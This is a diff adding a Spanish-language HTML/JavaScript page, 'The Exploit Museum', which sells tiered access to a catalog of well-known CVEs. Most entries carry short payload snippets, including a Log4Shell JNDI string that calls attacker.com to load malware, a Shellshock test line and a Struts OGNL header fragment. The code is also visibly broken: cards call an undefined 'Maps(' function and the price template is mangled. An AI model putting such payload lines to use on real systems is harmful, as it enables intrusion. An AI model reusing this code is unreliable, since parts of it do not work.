@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Exploit Museum | Archivo Digital de Vulnerabilidades</title>
+    <!-- Carga de Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Carga de la fuente Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
+    <!-- Carga de Lucide Icons (Solo SVG, no es una dependencia pesada) -->
+    <script type="module">
+        import { createIcons, Zap, Shield, Lock, Unlock, Terminal, Cpu, Zap, CreditCard, QrCode, Eye, Globe, AlertTriangle, Database, ChevronRight, CheckCircle, XCircle, Server, User, LogOut, Ghost, Fingerprint, Activity, Hash, AlertOctagon, Search } from 'https://cdn.jsdelivr.net/npm/lucide-icons@0.344.0/dist/esm/lucide.js';
+        window.lucide = { createIcons, Zap, Shield, Lock, Unlock, Terminal, Cpu, Zap, CreditCard, QrCode, Eye, Globe, AlertTriangle, Database, ChevronRight, CheckCircle, XCircle, Server, User, LogOut, Ghost, Fingerprint, Activity, Hash, AlertOctagon, Search };
+    </script>
+    <style>
+        /* Estilos específicos para la web */
+        body { font-family: 'Inter', sans-serif; }
+        .glitch-text { position: relative; }
+        .glitch-text:hover > span:nth-child(2) { opacity: 0.7; animation: pulse 1s infinite; }
+        .glitch-text:hover > span:nth-child(3) { opacity: 0.7; animation: pulse 1s infinite alternate-reverse; }
+
+        /* Animaciones */
+        @keyframes scan { 0% { top: 0%; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
+        @keyframes scan-fast { 0% { top: -10%; } 100% { top: 110%; } }
+        @keyframes spinY { from { transform: rotateY(0deg); } to { transform: rotateY(360deg); } }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes progress { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
+        
+        .animate-scan { animation: scan 2s linear infinite; }
+        .animate-scan-fast { animation: scan-fast 1.5s linear infinite; }
+        .animate-spin-slow { animation: spin 8s linear infinite; }
+        .animate-spin-slow-y { animation: spinY 10s linear infinite; }
+        .animate-progress { animation: progress 1.5s ease-out forwards; }
+
+        /* Matriz de Lluvia (Matrix Rain) */
+        #matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.1;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* Estilos 3D */
+        .perspective-1000 { perspective: 1000px; }
+        .preserve-3d { transform-style: preserve-3d; }
+        
+        /* Estilo de la máquina de escribir */
+        .typewriter {
+            overflow: hidden; /* Oculta el cursor de parpadeo */
+            white-space: nowrap; /* Evita que el texto se ajuste a la siguiente línea */
+            border-right: 0.15em solid orange; /* Cursor */
+            animation: 
+                typing 3s steps(40, end),
+                blink-caret 0.75s step-end infinite;
+        }
+
+        /* Animación de tecleado */
+        @keyframes typing {
+          from { width: 0 }
+          to { width: 100% }
+        }
+
+        /* Animación del cursor */
+        @keyframes blink-caret {
+          from, to { border-color: transparent }
+          50% { border-color: orange }
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 min-h-screen">
+    
+    <!-- Lluvia de Matrix (Matrix Rain) -->
+    <canvas id="matrix-rain"></canvas>
+
+    <!-- Preloader -->
+    <div id="preloader" class="fixed inset-0 bg-black text-cyan-500 font-mono flex flex-col items-center justify-center z-[100]">
+        <div data-lucide="terminal" class="mb-4 animate-pulse" size="48"></div>
+        <div class="text-2xl tracking-[0.2em] font-black z-10">THE VAULT</div>
+        <div class="mt-4 w-64 h-1 bg-slate-800 rounded overflow-hidden z-10">
+          <div id="progress-bar" class="h-full bg-purple-600 animate-progress"></div>
+        </div>
+        <div id="loading-text" class="mt-2 text-xs text-slate-400 font-mono z-10">Initializing System...</div>
+    </div>
+
+    <!-- Navegación -->
+    <nav class="fixed top-0 left-0 w-full z-40 bg-slate-950/90 backdrop-blur-md border-b border-white/5 shadow-lg">
+        <div class="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
+            <div id="logo-home" class="flex items-center gap-2 cursor-pointer group" onclick="navigate('home')">
+                <div data-lucide="shield" class="text-purple-500 group-hover:text-cyan-400 transition-colors"></div>
+                <span class="font-bold text-xl tracking-tighter text-white">
+                    EXPLOIT<span class="text-purple-500 group-hover:text-cyan-400 transition-colors">MUSEUM</span>
+                </span>
+            </div>
+            <div class="hidden md:flex items-center gap-8 text-xs font-mono tracking-widest">
+                <button class="nav-link" data-view="home" onclick="navigate('home')">HOME</button>
+                <button class="nav-link" data-view="vault" onclick="navigate('vault')">ARCHIVE</button>
+                <button class="nav-link" data-view="pricing" onclick="navigate('pricing')">ACCESS</button>
+            </div>
+            <div class="flex items-center gap-4">
+                <div class="text-right hidden sm:block">
+                    <div class="text-[10px] text-slate-500 uppercase tracking-widest">Clearance</div>
+                    <div id="user-role-display" class="text-xs font-bold uppercase text-cyan-400">FREE</div>
+                </div>
+                <div id="user-icon" class="w-8 h-8 rounded border flex items-center justify-center bg-slate-800 border-slate-700">
+                    <div data-lucide="user" class="text-slate-400" size="16"></div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Contenido Principal -->
+    <main id="main-content" class="relative z-10 pt-20 pb-20">
+        <!-- SECCIÓN HOME -->
+        <section id="view-home" class="view-section flex flex-col items-center justify-center min-h-[80vh] text-center px-4 relative overflow-hidden hidden">
+            <!-- Background effects -->
+            <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-purple-600/10 rounded-full blur-[100px] pointer-events-none"></div>
+            <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-cyan-600/10 rounded-full blur-[100px] pointer-events-none"></div>
+            
+            <div class="mb-6 inline-flex items-center gap-2 px-4 py-1 rounded-full border border-cyan-500/30 bg-cyan-950/20 text-cyan-400 text-[10px] font-mono tracking-widest uppercase">
+                <span class="w-2 h-2 rounded-full bg-cyan-400 animate-pulse shadow-[0_0_10px_#22d3ee]"></span>
+                System Online: <span id="indexed-records"></span> Threats Indexed
+            </div>
+
+            <h1 class="text-5xl md:text-8xl font-black tracking-tighter mb-6 text-white drop-shadow-[0_0_30px_rgba(168,85,247,0.5)] glitch-text">
+                <span class="relative z-10">THE EXPLOIT MUSEUM</span>
+                <span class="absolute top-0 left-0 -ml-0.5 translate-x-[2px] text-red-500 z-0">THE EXPLOIT MUSEUM</span>
+                <span class="absolute top-0 left-0 -ml-0.5 -translate-x-[2px] text-cyan-500 z-0">THE EXPLOIT MUSEUM</span>
+            </h1>
+
+            <p class="max-w-2xl text-slate-400 text-lg mb-10 leading-relaxed">
+                La base de datos definitiva de <span class="text-white font-bold">Ciberseguridad Ofensiva</span>. 
+                Desde el primer gusano Morris hasta los exploits Zero-Day de hoy.
+            </p>
+            <div class="flex gap-4">
+                <button onclick="navigate('vault')" class="px-8 py-4 bg-white text-black font-bold hover:bg-cyan-50 transition flex items-center gap-2 rounded-sm shadow-[0_0_20px_rgba(255,255,255,0.2)] group">
+                    <div data-lucide="database" class="group-hover:scale-110 transition-transform" size="18"></div>
+                    EXPLORAR ARCHIVO
+                </button>
+                <button onclick="navigate('pricing')" class="px-8 py-4 bg-transparent border border-white/20 text-white font-bold hover:border-purple-500 hover:text-purple-400 transition flex items-center gap-2 rounded-sm backdrop-blur-sm">
+                    <div data-lucide="zap" size="18"></div>
+                    OBTENER ACCESO
+                </button>
+            </div>
+            <div class="mt-24 grid grid-cols-1 md:grid-cols-3 gap-4 text-left w-full max-w-6xl px-4">
+                <!-- Se llenan con JS -->
+                <div class="p-6 rounded border border-white/5 bg-slate-900/40 backdrop-blur-sm hover:border-cyan-500/30 transition duration-300 group">
+                    <div data-lucide="ghost" class="text-slate-600 mb-4 group-hover:text-cyan-400 transition-colors" size="24"></div>
+                    <h3 class="text-lg font-bold text-white mb-2 font-mono uppercase tracking-wider">0-Day Analysis</h3>
+                    <p class="text-sm text-slate-400 leading-relaxed">Análisis profundo de vulnerabilidades.</p>
+                </div>
+                <div class="p-6 rounded border border-white/5 bg-slate-900/40 backdrop-blur-sm hover:border-cyan-500/30 transition duration-300 group">
+                    <div data-lucide="terminal" class="text-slate-600 mb-4 group-hover:text-cyan-400 transition-colors" size="24"></div>
+                    <h3 class="text-lg font-bold text-white mb-2 font-mono uppercase tracking-wider">Payloads Reales</h3>
+                    <p class="text-sm text-slate-400 leading-relaxed">Snippets de código de incidentes reales.</p>
+                </div>
+                <div class="p-6 rounded border border-white/5 bg-slate-900/40 backdrop-blur-sm hover:border-cyan-500/30 transition duration-300 group">
+                    <div data-lucide="globe" class="text-slate-600 mb-4 group-hover:text-cyan-400 transition-colors" size="24"></div>
+                    <h3 class="text-lg font-bold text-white mb-2 font-mono uppercase tracking-wider">Cyber Warfare</h3>
+                    <p class="text-sm text-slate-400 leading-relaxed">Historia de ataques estado-nación.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECCIÓN PRICING -->
+        <section id="view-pricing" class="view-section max-w-7xl mx-auto px-4 py-10 hidden">
+            <div class="text-center mb-16">
+              <h2 class="text-4xl font-bold text-white mb-4 tracking-tight">SECURITY CLEARANCE LEVELS</h2>
+              <p class="text-slate-400">El conocimiento es poder. Elige tu nivel de acceso.</p>
+            </div>
+            <div id="pricing-plans" class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Los planes se insertan aquí por JS -->
+            </div>
+        </section>
+
+        <!-- SECCIÓN VAULT (LISTA DE VULNERABILIDADES) -->
+        <section id="view-vault" class="view-section max-w-7xl mx-auto px-4 hidden">
+            <div class="flex flex-col md:flex-row items-end justify-between mb-8 border-b border-white/10 pb-6 gap-4">
+              <div>
+                <h2 class="text-3xl font-bold text-white flex items-center gap-3 tracking-tight">
+                  <div data-lucide="database" class="text-purple-500"></div>
+                  THREAT DATABASE
+                </h2>
+                <p class="text-slate-400 mt-2 font-mono text-sm flex items-center gap-2">
+                  <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                  Indexing <span id="vuln-count"></span> records.
+                </p>
+              </div>
+              <div class="w-full md:w-auto relative">
+                <input type="text" id="search-input" placeholder="Search CVE, Name, Type..." oninput="renderVault()" class="w-full md:w-64 bg-slate-900 border border-slate-700 rounded py-2 pl-10 pr-4 text-sm focus:outline-none focus:border-cyan-500 text-white placeholder-slate-600" />
+                <div data-lucide="search" class="absolute left-3 top-2.5 text-slate-600" size="16"></div>
+              </div>
+            </div>
+            <div id="vulnerability-list" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Las tarjetas de vulnerabilidades se insertan aquí por JS -->
+            </div>
+        </section>
+
+        <!-- SECCIÓN DETALLE DE VULNERABILIDAD -->
+        <section id="view-vuln-detail" class="view-section max-w-6xl mx-auto px-4 hidden">
+            <button onclick="navigate('vault')" class="mb-8 flex items-center gap-2 text-slate-500 hover:text-white transition text-sm font-mono uppercase tracking-widest">
+              <div data-lucide="chevron-right" class="rotate-180" size="16"></div> Return to Archive
+            </button>
+            <div id="vuln-detail-content">
+                <!-- El detalle de la vulnerabilidad se inserta aquí por JS -->
+            </div>
+        </section>
+    </main>
+
+    <!-- Modal de Pago -->
+    <div id="payment-modal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-sm p-4 hidden">
+        <!-- El contenido del modal se inserta aquí por JS -->
+    </div>
+
+
+    <script>
+        // --- 1. CONFIGURACIÓN Y DATOS ---
+
+        const USD_TO_ARS = 1478;
+        const EMAIL_CONTACT = "tbrcarabelli@gmail.com";
+        const MP_ALIAS = "brunsss.mp";
+
+        const PLANS = [
+            { id: 'breacher', name: 'BREACHER', priceUsd: 5, features: ['Acceso a Logs Básicos', 'PDFs Técnicos', 'Comunidad Privada'], color: 'from-blue-500 to-cyan-400', borderColor: 'border-cyan-400' },
+            { id: 'zeroday', name: 'ZERO-DAY HUNTER', priceUsd: 12, features: ['Todo lo de Breacher', 'Alertas CVE en tiempo real', 'Simuladores de Ataque', 'Acceso a Exploits Archivados'], color: 'from-purple-500 to-pink-500', borderColor: 'border-purple-500' },
+            { id: 'root', name: 'GOD MODE', priceUsd: 25, features: ['ACCESO TOTAL AL VAULT', 'Laboratorio 3D Full', 'Demos Interactivas', 'Soporte Prioritario 24/7'], color: 'from-red-500 to-orange-500', borderColor: 'border-red-500', glitch: true }
+        ];
+
+        const VULNERABILITIES = [
+            { id: 'stuxnet', title: 'STUXNET', cve: 'CVE-2010-2772', year: 2010, severity: 'LEGENDARY', score: 10.0, description: 'El primer arma cibernética real. Un gusano diseñado específicamente para atacar controladores lógicos programables (PLC) SCADA de Siemens.', impact: 'Destruyó físicamente 1,000 centrifugadoras nucleares en Natanz, Irán.', affected: ['Siemens S7-300', 'Infraestructura Nuclear Iraní'], patched: true, premium: true, reqRole: 'root', type: 'Cyber-Physical Weapon', codeSnippet: 'MOV DB1.DBD0, 16#DEADBEEF ; Modificación de RPM en PLC Siemens' },
+            { id: 'wannacry', title: 'WANNACRY', cve: 'CVE-2017-0144', year: 2017, severity: 'CRITICAL', score: 10.0, description: 'Ransomware criptogusano que usaba el exploit EternalBlue para propagarse automáticamente.', impact: 'Paralizó el NHS (salud) en UK, Telefónica en España y FedEx.', affected: ['Windows XP', 'Windows 7'], patched: true, premium: false, type: 'Ransomware / SMB Exploit', codeSnippet: 'smb_send(ip, eternal_blue_payload); // Propagación automática' },
+            { id: 'log4shell', title: 'LOG4SHELL', cve: 'CVE-2021-44228', year: 2021, severity: 'CATASTROPHIC', score: 10.0, description: 'Fallo en Log4j que permitía RCE enviando una cadena JNDI simple.', impact: 'Afectó a casi todo el internet empresarial: Apple, Tesla, Steam, Minecraft.', affected: ['Apache Log4j2', 'Java Apps'], patched: true, premium: true, reqRole: 'breacher', type: 'JNDI Injection', codeSnippet: '\${jndi:ldap://attacker.com/malware} // Logueado por el servidor' },
+            { id: 'heartbleed', title: 'HEARTBLEED', cve: 'CVE-2014-0160', year: 2014, severity: 'CRITICAL', score: 9.8, description: 'Error de lectura de límites en OpenSSL. Permitía leer memoria del servidor.', impact: 'Expuso claves privadas SSL de millones de sitios.', affected: ['OpenSSL'], patched: true, premium: false, type: 'Buffer Over-read', codeSnippet: 'memcpy(bp, pl, payload); // Sin chequear longitud' },
+            { id: 'eternalblue', title: 'ETERNALBLUE', cve: 'CVE-2017-0144', year: 2017, severity: 'CRITICAL', score: 9.9, description: 'Exploit de la NSA para SMBv1. Permite enviar paquetes diseñados para ejecutar código arbitrario.', impact: 'Base de WannaCry y NotPetya.', affected: ['Windows pre-parche'], patched: true, premium: false, type: 'RCE / Buffer Overflow', codeSnippet: '// Heap grooming + Overflow en Srv!SrvOs2FeaListSizeToNt' },
+            { id: 'spectre', title: 'SPECTRE', cve: 'CVE-2017-5753', year: 2018, severity: 'HIGH', score: 8.5, description: 'Explotación de la ejecución especulativa en CPUs modernos.', impact: 'Rompió el aislamiento entre aplicaciones a nivel hardware.', affected: ['Intel', 'AMD', 'ARM'], patched: 'Mitigado', premium: true, reqRole: 'root', type: 'Side-Channel Attack', codeSnippet: 'if (x < array1_size) y = array2[array1[x] * 4096];' },
+            { id: 'bluekeep', title: 'BLUEKEEP', cve: 'CVE-2019-0708', year: 2019, severity: 'CRITICAL', score: 9.8, description: 'Vulnerabilidad RDP wormable que permite RCE sin autenticación.', impact: 'Potencial catastrófico en sistemas Windows legacy.', affected: ['Windows 7', 'Server 2008'], patched: true, premium: true, reqRole: 'zeroday', type: 'Use-after-free RDP', codeSnippet: '// Manipulación de canales virtuales RDP MS_T120' },
+            { id: 'solarwinds', title: 'SUNBURST', cve: 'CVE-2020-10148', year: 2020, severity: 'CRITICAL', score: 10.0, description: 'Backdoor inyectado en actualizaciones legítimas de SolarWinds Orion.', impact: 'Comprometió al gobierno de USA y Fortune 500.', affected: ['SolarWinds Orion'], patched: true, premium: true, reqRole: 'root', type: 'Supply Chain Attack', codeSnippet: 'OrionImprovementBusinessLayer.Initialize(); // Backdoor' },
+            { id: 'shellshock', title: 'SHELLSHOCK', cve: 'CVE-2014-6271', year: 2014, severity: 'CRITICAL', score: 10.0, description: 'Variables de entorno en Bash interpretadas como comandos.', impact: 'Control total de servidores web CGI.', affected: ['Bash', 'Linux', 'macOS'], patched: true, premium: true, reqRole: 'breacher', type: 'Command Injection', codeSnippet: 'env x=\\'() { :;}; echo vulnerable\\' bash -c "echo test"' },
+            { id: 'equifax', title: 'EQUIFAX STRUTS', cve: 'CVE-2017-5638', year: 2017, severity: 'CRITICAL', score: 9.8, description: 'RCE en Apache Struts vía header Content-Type.', impact: 'Robo de datos de 147 millones de personas.', affected: ['Apache Struts 2'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE', codeSnippet: 'Content-Type: %{(#context.setMemberAccess(#_memberAccess)...' },
+            { id: 'dirtycow', title: 'DIRTY COW', cve: 'CVE-2016-5195', year: 2016, severity: 'HIGH', score: 7.8, description: 'Race condition en kernel Linux (Copy-On-Write).', impact: 'Escalada de privilegios local a root.', affected: ['Linux Kernel'], patched: true, premium: false, type: 'Privilege Escalation', codeSnippet: 'mmap(..., PROT_READ, MAP_PRIVATE, fd, 0); // Race' },
+            { id: 'zerologon', title: 'ZEROLOGON', cve: 'CVE-2020-1472', year: 2020, severity: 'CRITICAL', score: 10.0, description: 'Fallo criptográfico en Netlogon. Permite poner password de DC a ceros.', impact: 'Toma de control total del dominio Windows.', affected: ['Windows Server'], patched: true, premium: true, reqRole: 'zeroday', type: 'Crypto Flaw', codeSnippet: 'client_challenge = "00000000"; // Bypass AES-CFB8' },
+            { id: 'proxylogon', title: 'PROXYLOGON', cve: 'CVE-2021-26855', year: 2021, severity: 'CRITICAL', score: 9.8, description: 'Chain de exploits en MS Exchange Server.', impact: 'Acceso total a emails corporativos.', affected: ['Exchange Server'], patched: true, premium: true, reqRole: 'root', type: 'SSRF to RCE', codeSnippet: 'Cookie: X-AnonResource=true; ...' },
+            { id: 'follina', title: 'FOLLINA', cve: 'CVE-2022-30190', year: 2022, severity: 'HIGH', score: 7.8, description: 'RCE en MSDT vía documentos Word sin macros.', impact: 'Ejecución de código al previsualizar doc.', affected: ['Office', 'MSDT'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE', codeSnippet: 'ms-msdt:/id PCWDiagnostic ...' },
+            { id: 'spring4shell', title: 'SPRING4SHELL', cve: 'CVE-2022-22965', year: 2022, severity: 'CRITICAL', score: 9.8, description: 'RCE en Spring Framework vía Data Binding.', impact: 'Similar a Log4j pero más complejo.', affected: ['Spring MVC'], patched: true, premium: true, reqRole: 'root', type: 'RCE', codeSnippet: 'class.module.classLoader...' },
+            { id: 'krack', title: 'KRACK', cve: 'CVE-2017-13077', year: 2017, severity: 'HIGH', score: 8.1, description: 'Key Reinstallation Attack en WPA2.', impact: 'Intercepción de tráfico Wi-Fi.', affected: ['WPA2 Protocol'], patched: true, premium: true, reqRole: 'zeroday', type: 'Protocol Flaw', codeSnippet: '// Reinstall encryption key' },
+            { id: 'printnightmare', title: 'PRINTNIGHTMARE', cve: 'CVE-2021-34527', year: 2021, severity: 'HIGH', score: 8.8, description: 'RCE en Print Spooler de Windows.', impact: 'Cualquier usuario podía ser admin del dominio.', affected: ['Print Spooler'], patched: true, premium: true, reqRole: 'zeroday', type: 'RCE / LPE', codeSnippet: 'RpcAddPrinterDriverEx(...)' }
+        ];
+
+        // --- 2. ESTADO DE LA APLICACIÓN ---
+
+        let state = {
+            user: { role: 'free', name: 'Guest', email: '' },
+            currentView: 'home',
+            selectedVuln: null,
+            modalPlan: null,
+            isAuthReady: false
+        };
+
+        // --- 3. FUNCIONES DE LÓGICA DE NEGOCIO ---
+
+        const getAccessLevel = (role) => {
+            if (role === 'root') return 3;
+            if (role === 'zeroday') return 2;
+            if (role === 'breacher') return 1;
+            return 0;
+        };
+
+        const hasAccess = (vulnRole) => {
+            const userLevel = getAccessLevel(state.user.role);
+            const reqLevel = getAccessLevel(vulnRole || 'free');
+            return userLevel >= reqLevel;
+        };
+        
+        const formatCurrency = (amount) => {
+            return amount.toLocaleString('es-AR', { style: 'currency', currency: 'ARS', minimumFractionDigits: 0 });
+        }
+
+
+        // --- 4. CONTROL DE VISTAS ---
+
+        function navigate(viewName, vulnId = null) {
+            state.currentView = viewName;
+            
+            // Ocultar todas las secciones
+            document.querySelectorAll('.view-section').forEach(section => {
+                section.classList.add('hidden');
+            });
+
+            // Mostrar la sección correcta
+            const targetSection = document.getElementById(\`view-\${viewName}\`);
+            if (targetSection) {
+                targetSection.classList.remove('hidden');
+            }
+
+            // Actualizar enlaces de navegación
+            document.querySelectorAll('.nav-link').forEach(link => {
+                link.classList.remove('text-cyan-400', 'border-b', 'border-cyan-400');
+                if (link.dataset.view === viewName) {
+                    link.classList.add('text-cyan-400', 'border-b', 'border-cyan-400');
+                }
+            });
+
+            // Renderizado específico de la vista
+            if (viewName === 'home') renderHome();
+            if (viewName === 'pricing') renderPricing();
+            if (viewName === 'vault') renderVault();
+            if (viewName === 'vuln-detail' && vulnId) {
+                state.selectedVuln = VULNERABILITIES.find(v => v.id === vulnId);
+                renderDetail();
+            }
+            
+            updateHeader();
+            window.scrollTo(0, 0); // Scroll al inicio de la página
+            
+            // Volver a renderizar iconos de Lucide
+            if(window.lucide) {
+                window.lucide.createIcons();
+            }
+        }
+
+        // --- 5. FUNCIONES DE RENDERING (Generación de HTML) ---
+        
+        function updateHeader() {
+            const roleDisplay = document.getElementById('user-role-display');
+            const userIcon = document.getElementById('user-icon');
+
+            if (roleDisplay) {
+                roleDisplay.textContent = state.user.role.toUpperCase();
+                roleDisplay.classList.remove('text-red-500', 'animate-pulse');
+                
+                if (state.user.role === 'root') {
+                    roleDisplay.textContent = 'GOD MODE';
+                    roleDisplay.classList.add('text-red-500', 'animate-pulse');
+                    userIcon.className = 'w-8 h-8 rounded border flex items-center justify-center bg-red-900/20 border-red-500';
+                } else {
+                     userIcon.className = 'w-8 h-8 rounded border flex items-center justify-center bg-slate-800 border-slate-700';
+                }
+            }
+             if(window.lucide) {
+                window.lucide.createIcons();
+            }
+        }
+
+        function renderHome() {
+            document.getElementById('indexed-records').textContent = VULNERABILITIES.length;
+        }
+        
+        function renderPricing() {
+            const container = document.getElementById('pricing-plans');
+            container.innerHTML = PLANS.map(plan => {
+                const isCurrent = state.user.role === plan.id;
+                const buttonClass = isCurrent 
+                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed border border-slate-700'
+                    : 'bg-white text-black hover:bg-slate-200 border border-transparent';
+                const buttonText = isCurrent ? 'CURRENT LEVEL' : 'INITIATE UPGRADE';
+                const shadow = plan.id === 'root' ? 'shadow-[0_0_50px_rgba(239,68,68,0.4)]' : 'shadow-2xl';
+
+                return \`
+                    <div class="relative bg-slate-900/80 backdrop-blur-md rounded-xl border \${plan.borderColor} p-8 flex flex-col hover:transform hover:-translate-y-1 transition duration-300 \${shadow} overflow-hidden group">
+                        \${plan.id === 'root' ? \`<div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-orange-500 to-red-500 animate-scan-fast"></div>\` : ''}
+                        <div class="mb-6">
+                            <h3 class="text-2xl font-black uppercase tracking-widest bg-gradient-to-r \${plan.color} bg-clip-text text-transparent">\${plan.name}</h3>
+                            <div class="flex items-end gap-2 mt-4">
+                                <span class="text-5xl font-bold text-white">\$$\{plan.priceUsd\}</span>
+                                <span class="text-slate-500 mb-2 text-xs font-mono uppercase">/ Pago Único</span>
+                            </div>
+                            <div class="text-xs text-slate-500 font-mono mt-2 pt-2 border-t border-white/5">
+                                ≈ \${formatCurrency(plan.priceUsd * USD_TO_ARS)}
+                            </div>
+                        </div>
+                        <ul class="space-y-4 mb-8 flex-1">
+                            \${plan.features.map(feat => \`
+                                <li class="flex items-start gap-3 text-slate-300 text-sm font-mono">
+                                    <div data-lucide="check-circle" size="16" class="mt-0.5 shrink-0 \${plan.id === 'root' ? 'text-red-500' : 'text-cyan-500'}"></div>
+                                    \${feat}
+                                </li>
+                            \`).join('')}
+                        </ul>
+                        <button onclick="showPaymentModal('\${plan.id}')" class="w-full py-4 rounded font-bold uppercase tracking-widest transition-all relative overflow-hidden \${buttonClass}" \${isCurrent ? 'disabled' : ''}>
+                            \${plan.id === 'root' && !isCurrent ? '<span class="absolute inset-0 bg-red-500 mix-blend-multiply opacity-20"></span>' : ''}
+                            \${buttonText}
+                        </button>
+                    </div>
+                \`;
+            }).join('');
+             if(window.lucide) {
+                window.lucide.createIcons();
+            }
+        }
+
+        function renderVault() {
+            const container = document.getElementById('vulnerability-list');
+            const searchInput = document.getElementById('search-input').value.toLowerCase();
+            
+            const filteredVulns = VULNERABILITIES.filter(v => 
+                v.title.toLowerCase().includes(searchInput) ||
+                v.cve.toLowerCase().includes(searchInput) ||
+                v.type.toLowerCase().includes(searchInput)
+            );
+
+            document.getElementById('vuln-count').textContent = filteredVulns.length;
+            
+            container.innerHTML = filteredVulns.map(vuln => {
+                const locked = vuln.premium && !hasAccess(vuln.reqRole);
+                const clickAction = locked 
+                    ? \`showPaymentModal('\${vuln.reqRole}')\` 
+                    : \`Maps('vuln-detail', '\${vuln.id}')\`;
+                
+                const lockIcon = locked ? '<div data-lucide="lock" size="16" class="text-slate-700"></div>' : '<div data-lucide="unlock" size="16" class="text-cyan-500 opacity-0 group-hover:opacity-100 transition"></div>';
+                const lockOverlay = locked ? \`
+                    <div class="absolute inset-0 flex items-center justify-center backdrop-blur-sm bg-black/20 z-10">
+                        <div class="bg-black border border-red-900/50 p-3 rounded flex items-center gap-2 text-red-500 font-mono text-xs uppercase tracking-widest shadow-2xl transform group-hover:scale-105 transition">
+                            <div data-lucide="lock" size="12"></div> Requires \${vuln.reqRole}
+                        </div>
+                    </div>
+                \` : '';
+                
+                return \`
+                    <div onclick="\${clickAction}" class="relative p-6 rounded border transition-all duration-200 cursor-pointer group overflow-hidden \${locked ? 'bg-slate-900/30 border-slate-800 hover:border-slate-700' : 'bg-slate-900/80 border-white/10 hover:border-cyan-500/50 hover:bg-slate-800'}">
+                        \${!locked ? '<div class="absolute inset-0 bg-gradient-to-b from-transparent via-cyan-500/5 to-transparent opacity-0 group-hover:opacity-100 translate-y-[-100%] group-hover:translate-y-[100%] transition-all duration-700 pointer-events-none"></div>' : ''}
+                        <div class="flex justify-between items-start mb-4">
+                            <div class="px-2 py-1 rounded text-[10px] font-bold font-mono tracking-wider \${locked ? 'bg-slate-800 text-slate-600' : 'bg-purple-900/20 text-purple-400 border border-purple-500/20'}">\${vuln.cve.split(' ')[0]}</div>
+                            \${lockIcon}
+                        </div>
+                        <h3 class="text-lg font-bold mb-2 font-mono uppercase truncate \${locked ? 'text-slate-600 blur-[1px]' : 'text-white'}">\${vuln.title}</h3>
+                        <div class="flex gap-2 mb-4">
+                            <span class="text-[10px] uppercase px-1.5 py-0.5 rounded border \${locked ? 'border-slate-800 text-slate-700' : 'border-slate-700 text-slate-400'}">\${vuln.type}</span>
+                        </div>
+                        \${lockOverlay}
+                        <div class="flex items-center justify-between pt-4 border-t border-white/5">
+                            <span class="text-xs font-mono \${locked ? 'text-slate-800' : 'text-slate-500'}">\${vuln.year}</span>
+                            <div class="flex items-center gap-2">
+                                <span class="text-xs font-bold \${locked ? 'text-slate-800' : vuln.score >= 9 ? 'text-red-500' : 'text-yellow-500'}">CVSS \${vuln.score}</span>
+                                <div data-lucide="alert-octagon" size="12" class="\${locked ? 'text-slate-800' : vuln.score >= 9 ? 'text-red-500' : 'text-yellow-500'}"></div>
+                            </div>
+                        </div>
+                    </div>
+                \`;
+            }).join('');
+             if(window.lucide) {
+                window.lucide.createIcons();
+            }
+        }
+        
+        function renderDetail() {
+            const vuln = state.selectedVuln;
+            if (!vuln) return;
+            
+            const content = \`
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                    <div class="lg:col-span-2 space-y-8">
+                        <div>
+                            <div class="flex flex-wrap items-center gap-4 mb-6">
+                                <h1 class="text-5xl font-black text-white tracking-tighter">\${vuln.title}</h1>
+                                <div class="px-3 py-1 bg-red-500/10 text-red-500 border border-red-500/50 rounded text-xs font-bold font-mono">SEVERITY: \${vuln.score}</div>
+                                 <div class="px-3 py-1 bg-slate-800 text-slate-300 rounded text-xs font-bold font-mono">\${vuln.cve}</div>
+                            </div>
+                            <p class="text-xl text-slate-300 leading-relaxed border-l-2 border-purple-500 pl-6 font-light">\${vuln.description}</p>
+                        </div>
+                        <div class="bg-black rounded-lg border border-slate-800 overflow-hidden shadow-2xl">
+                           <div class="bg-slate-900 px-4 py-2 flex items-center justify-between border-b border-slate-800">
+                              <h3 class="text-xs font-bold text-slate-400 flex items-center gap-2 uppercase tracking-widest"><div data-lucide="terminal" size="14" class="text-green-500"></div> Payload / Vector Concept</h3>
+                              <div class="flex gap-1.5"><div class="w-2.5 h-2.5 rounded-full bg-slate-700"></div><div class="w-2.5 h-2.5 rounded-full bg-slate-700"></div></div>
+                           </div>
+                           <div class="p-6 font-mono text-sm text-slate-300 overflow-x-auto">
+                             <p class="text-slate-500 mb-2"># Technical Implementation (Sanitized)</p>
+                             <div class="text-green-400 typewriter-text">\${vuln.codeSnippet || "// Code censored for security reasons"}</div>
+                             <p class="mt-4 text-yellow-500 animate-pulse">&gt; EXECUTION HALTED BY SAFEGUARD PROTOCOL_</p>
+                           </div>
+                        </div>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                          <div class="bg-slate-900/30 p-6 rounded border border-white/5">
+                            <h4 class="text-cyan-500 text-xs font-bold mb-3 uppercase tracking-widest flex items-center gap-2"><div data-lucide="globe" size="14"></div> Real World Impact</h4>
